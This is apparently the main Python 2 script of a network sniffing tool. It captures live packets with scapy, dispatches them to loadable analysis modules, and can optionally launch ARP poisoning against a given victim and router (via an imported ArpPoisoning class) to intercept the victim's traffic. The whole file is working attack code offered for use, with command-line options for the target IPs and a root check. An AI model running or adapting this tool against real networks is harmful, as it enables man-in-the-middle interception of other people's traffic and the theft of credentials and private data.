#!/usr/bin/python
# -*- coding: utf-8 -*-

#
##################################################################
#
# THE BEER-WARE LICENSE" (Revision 42):
# Ganapati wrote this file. As long as you retain
# this notice you can do whatever you want with this stuff. If we
# meet some day, and you think this stuff is worth it, you can buy
# me a beer in return.
#
##################################################################
#

import argparse
from scapy.all import *
import sys
import os
import glob
from arp import ArpPoisoning
import signal

loaded_modules = []
arp_poisoning = None

def analyze(packet):
    try:
        for loaded_module in loaded_modules:
            loaded_module.processPacket(packet)
    except:
        pass

def startNetwork(interface, arp):
    # ARP poisoning preparation
    if arp != None:
        global arp_poisoning
#       try:
        arp_poisoning = ArpPoisoning()
        # Configure routing and iptables for arp poisoning
        arp_poisoning.configure(interface)
            
        # Prepare packet
        ips = arp.split('-')
        arp_poisoning.setPacket(ips[1], ips[0])
            
        print "[*] Start arp poisoning"
        arp_poisoning.start()
#       except:
#           arp_poisoning = None
#           print "[!] ARP poisoning failed"

    # Sniffing packets
    print "[*] Start sniffind on %s" % interface
    sniff(prn=analyze, store=0, iface=interface)

def loadModules(path, modules_to_load):
    print "[*] Loading modules"
    files = glob.glob(path + "*")
    for file in files:
        file_name, file_extension = os.path.splitext(file)
        if not file_name.endswith("__init__") and file_extension == ".py" and (modules_to_load == None or (file_name.replace(path, "").split(".")[-1] in modules_to_load.replace(" ", "").split(","))):
            module_name = file_name.replace("/", ".")
            mod = __import__(module_name)
            modules = module_name.split(".")
            for module in modules[1:]:
                mod = getattr(mod, module)
            loaded_modules.append(mod.module())
            if modules_to_load != None:
                print "    |-Using %s" % loaded_modules[-1].module_name
    if modules_to_load == None:
        print "    |-Using all modules"

def listModules():
    print "[*] List of all modules"
    for module in loaded_modules:
        print "    |-%s" % module.getDescription()

def SigIntHand(SIG, FRM):
    global arp_poisoning
    if arp_poisoning != None:
        print "[*] Stop arp poisoning"
        arp_poisoning.stop()
    print "[*] Stop sniffing"
    sys.exit(0)

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='Simple live network sniffer')
    parser.add_argument('-i', '--interface', action="store", dest="interface", default=None, help='input interface')
    parser.add_argument('-m', '--modules', action="store", dest="modules", default=None, help='Modules to load (None = all)')
    parser.add_argument('-l', '--list', action="store_true", dest="list", default=False, help='List all modules')
    parser.add_argument('-a', '--arp', action="store", dest="arp", default=None, help='arp poisoning victim-router (ex : 192.168.0.255-192.168.0.1)')
    args = parser.parse_args()

    loadModules('modules/', args.modules)

    if args.list:
        listModules()
        sys.exit(0)

    if os.geteuid() != 0:
        print "[!] You must be root for sniffing network"
        sys.exit(0)

    if args.interface != None:
        # Signal handler
        signal.signal(signal.SIGINT, SigIntHand)
        # Start sniffing and arp poisoning
        startNetwork(args.interface, args.arp)
    else:
        print "[!] You must enter a valid interface using -i (ex: -i mon0)"
        sys.exit(0)
